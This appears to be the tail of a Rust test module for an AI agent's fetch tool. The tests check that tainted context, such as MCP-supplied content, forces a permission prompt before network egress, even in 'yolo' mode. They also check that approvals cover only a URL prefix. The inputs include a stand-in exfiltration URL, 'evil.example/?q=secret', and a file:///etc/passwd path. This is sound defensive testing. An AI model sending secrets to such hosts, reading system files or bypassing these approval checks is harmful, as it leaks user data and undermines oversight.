        assert_eq!(url_prefix("docs.rs/regex").as_deref(), Some("https://docs.rs/regex/"));
        assert_eq!(url_prefix("https://evil.example/?q=secret").as_deref(), Some("https://evil.example/"));
        assert_eq!(egress_key("https://docs.rs/regex?q=1").as_deref(), Some("https://docs.rs/regex/"));
        assert_eq!(egress_key("https://docs.rs/regexp").as_deref(), Some("https://docs.rs/regexp/"));
        assert!(!egress_key("https://docs.rs/regexp").unwrap().starts_with(&url_prefix("https://docs.rs/regex").unwrap()));
        assert_eq!(egress_key("file:///etc/passwd"), None);
    }

    #[tokio::test]
    async fn once_tainted_always_covers_the_url_prefix_not_the_site() {
        let s = TestServer::start(|_| Response::text("ok", "text/plain")).await;
        let asked = Asked::new(Decision::Always);
        let ctx = ToolContext { yolo: true, ..ctx(&asked) };
        ctx.taint.mark(Provenance::Mcp);
        let tool = local_tool();
        fetch(&tool, &format!("{}/docs/a", s.base()), None, &ctx).await;
        assert!(asked.requests.lock().unwrap()[0].must_ask);
        let under = fetch(&tool, &format!("{}/docs/b?x=1", s.base()), None, &ctx).await;
        assert!(!under.result.is_error, "{}", under.result.output);
        assert_eq!(asked.count(), 1, "a URL under the approved prefix asked again");
        fetch(&tool, &format!("{}/other/c", s.base()), None, &ctx).await;
        assert_eq!(asked.count(), 2, "same site, new prefix: asks");
    }
}
